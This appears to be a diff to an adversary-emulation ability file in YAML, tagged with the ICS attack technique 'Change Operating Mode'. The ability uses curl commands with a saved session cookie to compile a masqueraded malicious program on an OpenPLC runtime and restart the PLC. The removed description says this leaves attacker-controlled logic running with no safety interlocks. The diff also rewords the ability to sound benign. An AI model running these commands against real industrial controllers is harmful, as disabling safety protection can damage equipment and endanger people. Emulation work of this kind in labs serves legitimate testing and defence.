@@ -1,11 +1,8 @@
 ---
 
 - id: c9d0e1f2-9999-9999-9999-000000000006
-  name: OpenPLC - Start PLC with Malicious Logic
-  description: |
-    Compile the masqueraded malicious program and restart the PLC
-    runtime. The PLC will now run attacker-controlled logic with
-    no safety interlocks, causing loss of protection.
+  name: OpenPLC - Start PLC with Uploaded Logic
+  description: Compile and start the PLC runtime
   tactic: execution
   technique_id: T0858
   technique_name: Change Operating Mode
@@ -13,11 +10,15 @@
   - platform: linux
     name: sh
     command: >
-      curl -s -b /tmp/plc.jar
-      -X POST "http://192.168.95.2:8080/compile-program?program_name=326339.st"
+      curl -s -b /tmp/plc_cookies.txt
+      -d "program_name=326339.st"
+      "http://192.168.95.2:8080/compile-program"
       -o /tmp/compile.html &&
-      echo "Compilation started... waiting 15s" && sleep 15 &&
-      curl -s -b /tmp/plc.jar
-      -X POST "http://192.168.95.2:8080/start-plc"
+      echo "COMPILATION_STARTED" &&
+      sleep 15 &&
+      curl -s -b /tmp/plc_cookies.txt
+      -d ""
+      "http://192.168.95.2:8080/start_plc"
       -o /tmp/start.html &&
-      echo "PLC_RESTARTED_WITH_MALICIOUS_LOGIC"
+      echo "PLC_STARTED"
+    timeout: 120
